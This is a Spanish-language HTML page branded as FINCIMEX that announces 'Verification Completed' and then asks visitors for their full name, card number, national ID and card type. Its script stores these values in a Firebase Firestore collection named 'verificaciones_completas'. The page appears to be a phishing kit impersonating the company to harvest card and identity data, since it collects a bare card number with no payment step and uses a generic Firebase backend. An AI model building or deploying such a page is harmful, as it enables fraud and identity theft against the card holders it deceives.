<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verificación Completada • FINCIMEX</title>

<style>
body{
  margin:0;
  padding:0;
  font-family:"Segoe UI", Arial, sans-serif;
  background:#00111f url("img/fondo3.jpg") no-repeat center/cover;
  height:100vh;
  display:flex;
  flex-direction:column;
  justify-content:center;
  align-items:center;
  color:white;
  animation:fadeIn 1s ease;
}
@keyframes fadeIn{
  from{opacity:0;} to{opacity:1;}
}

.caja{
  background:rgba(0,0,0,0.55);
  padding:40px 30px;
  border-radius:20px;
  width:90%;
  max-width:400px;
  text-align:center;
  backdrop-filter: blur(4px);
  animation:scale 1.1s ease;
}

@keyframes scale{
  from{transform:scale(0.8); opacity:0;} 
  to{transform:scale(1); opacity:1;}
}

.icono{
  font-size:70px;
  color:#00ff7f;
  margin-bottom:15px;
}

h1{
  font-size:28px;
  margin-bottom:15px;
}

p{
  margin-top:0;
  margin-bottom:25px;
  font-size:16px;
  color:#e2e2e2;
}

input, select{
  width:100%;
  padding:12px;
  margin:8px 0;
  font-size:16px;
  border-radius:8px;
  border:none;
  outline:none;
  background: rgba(255,255,255,0.1);
  color:white;
}

.boton{
  background:#00a2ff;
  padding:12px 35px;
  border-radius:10px;
  display:inline-block;
  margin-top:15px;
  color:white;
  font-size:18px;
  text-decoration:none;
  transition:0.3s;
  font-weight:600;
  cursor:pointer;
}
.boton:hover{
  background:#007fcc;
}

.boton-secondary{
  background:#666;
  margin-left:10px;
}
.boton-secondary:hover{
  background:#444;
}

footer{
  position:absolute;
  bottom:20px;
  text-align:center;
  width:100%;
  color:#fff;
  opacity:0.8;
}
</style>
</head>
<body>

<div class="caja">
  <div class="icono">✔</div>
  <h1>Verificación Completada</h1>
  <p>Por favor completa los datos de verificación de tu tarjeta.</p>

  <!-- Formulario de verificación -->
  <input type="text" id="nombre" placeholder="Nombre completo">
  <input type="text" id="tarjeta" placeholder="Número de tarjeta">
  <input type="text" id="cedula" placeholder="Cédula / ID">
  <select id="tipo">
    <option value="">Tipo de tarjeta</option>
    <option value="CUP">CUP</option>
    <option value="MLC">MLC</option>
    <option value="AIS CUP">AIS CUP</option>
    <option value="AIS USD/MLC">AIS USD/MLC</option>
  </select>

  <button class="boton" onclick="guardarDatos()">Enviar Datos</button>
  <a href="index.html" class="boton boton-secondary">Volver al inicio</a>
</div>

<footer>
  FINCIMEX • Todos los derechos reservados
</footer>

<!-- ===== Firebase JS ===== -->
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
<script src="js/firebase.js"></script>

<script>
function guardarDatos(){
  const nombre = document.getElementById("nombre").value.trim();
  const tarjeta = document.getElementById("tarjeta").value.trim();
  const cedula = document.getElementById("cedula").value.trim();
  const tipo = document.getElementById("tipo").value;

  if(!nombre || !tarjeta || !cedula || !tipo){
    alert("Por favor completa todos los campos.");
    return;
  }

  // Guardar en Firebase Firestore
  db.collection("verificaciones_completas").add({
    nombre: nombre,
    tarjeta: tarjeta,
    cedula: cedula,
    tipo: tipo,
    timestamp: new Date()
  })
  .then(() => {
    alert("✅ Datos guardados correctamente.");
    // Limpiar formulario
    document.getElementById("nombre").value = "";
    document.getElementById("tarjeta").value = "";
    document.getElementById("cedula").value = "";
    document.getElementById("tipo").value = "";
  })
  .catch(err => {
    console.error("❌ Error guardando datos:", err);
    alert("Ocurrió un error al guardar los datos. Intenta nuevamente.");
  });
}
</script>

</body>
</html>
